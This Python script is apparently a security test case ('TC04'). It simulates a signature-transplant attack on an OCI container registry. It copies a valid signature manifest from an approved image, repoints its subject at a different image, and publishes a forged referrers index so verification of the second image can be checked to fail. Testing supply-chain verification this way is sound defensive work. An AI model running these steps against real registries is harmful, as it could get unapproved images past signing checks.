#!/usr/bin/env python3
"""ATTACK SIMULATION (TC04): re-attach the genuine signature of image A to a different image B.

An attacker who cannot access the private key copies a valid signature bundle from an
approved image onto their own image in the registry. The bundle is cryptographically
valid, but its signed payload names A's digest, so verification of B must fail.

Usage: forge_signature.py <registry> <repo> <signed-digest-A> <target-digest-B>
Works against the local registry's OCI referrers tag-schema fallback (tag "sha256-<digest>").
"""
import hashlib
import json
import sys
import urllib.request

IDX = "application/vnd.oci.image.index.v1+json"
MAN = "application/vnd.oci.image.manifest.v1+json"


def req(url, method="GET", body=None, ctype=None, accept=None):
    r = urllib.request.Request(url, data=body, method=method)
    if ctype:
        r.add_header("Content-Type", ctype)
    r.add_header("Accept", accept or f"{IDX},{MAN},application/vnd.docker.distribution.manifest.list.v2+json")
    with urllib.request.urlopen(r) as resp:
        return resp.read(), resp.headers


def main():
    reg, repo, src, dst = sys.argv[1:5]
    base = f"http://{reg}/v2/{repo}/manifests/"
    # 1. find the genuine signature manifest attached to A
    index = json.loads(req(base + src.replace(":", "-"))[0])
    sig_desc = index["manifests"][0]
    sig = json.loads(req(base + sig_desc["digest"], accept=MAN)[0])
    # 2. point its subject at B instead of A (the signed bundle layer is reused unchanged)
    body, headers = req(base + dst, method="HEAD")
    sig["subject"] = {"mediaType": headers["Content-Type"], "size": int(headers["Content-Length"]), "digest": dst}
    raw = json.dumps(sig).encode()
    new_digest = "sha256:" + hashlib.sha256(raw).hexdigest()
    req(base + new_digest, method="PUT", body=raw, ctype=MAN)
    # 3. publish it as B's referrer
    fake_index = {"schemaVersion": 2, "mediaType": IDX, "manifests": [dict(sig_desc, digest=new_digest, size=len(raw))]}
    req(base + dst.replace(":", "-"), method="PUT", body=json.dumps(fake_index).encode(), ctype=IDX)
    print(f"Copied signature bundle layer {sig['layers'][0]['digest'][:19]}… from {src[:19]}… onto {dst[:19]}…")


if __name__ == "__main__":
    main()
